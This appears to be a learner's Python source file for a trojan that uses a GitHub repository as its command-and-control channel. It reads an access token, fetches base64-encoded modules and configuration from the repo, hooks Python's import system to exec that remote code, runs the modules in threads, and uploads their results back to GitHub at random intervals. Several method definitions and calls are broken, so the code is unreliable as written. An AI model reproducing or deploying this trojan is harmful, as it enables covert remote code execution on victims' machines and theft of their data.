import  base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def get_file_contents(dirname, module_name, repo):
        return repo.file_contents(f'{dirname}/{module_name}').content

    def github_connect():
        with open('/home/kali/gitpass') as f:
            token = f.read()
        user = 'EdbangerRG'
        sess = github3.login(token = token)
        return sess.repository(user, 'bhptrojan')

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library) # if a module fails to load it will use the GitImporter class, if we can locate the file we decode it.
            return self
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        
        new_module = importlib.util.module_from_spec(spec) # shovel the code we retrieve from GitHub into it.
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module # insert the new module into sys.modules list
        return new_module

class Trojan:  # we assign the config info 

    def github_connect():
        with open('/home/kali/gitpass') as f:
            token = f.read()
        user = 'EdbangerRG'
        sess = github3.login(token = token)
        return sess.repository(user, 'bhptrojan')

    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/' #Output for the trojan
        self.repo = github_connect # connect to the repo
    

    def get_file_contents(dirname, module_name, repo):
        return repo.file_contents(f'{dirname}/{module_name}').content


    def get_config(self): # gets the config for the modules such that the trojan knows what modules to run
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module']) # brings the module content into the trojan object
        return config
    
    def module_runner(self, module): # calls the run function for the called module
        result = sys.modules[module].run()
        self.store_module_result(result)
    
    def store_module_results(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64decode(bindata)) # save the output with current date and time as filename

    def run(self):
        while True:
            config = self.get_config() # get the config file from the repo
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],)) # startsd the module in its own thread, and call the module run to run its code
            thread.start() # spits out a string that we push to repo.
            time.sleep(random.randint(1,10))

        time.sleep(random.randint(30*60, 3*60*60)) 



    
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
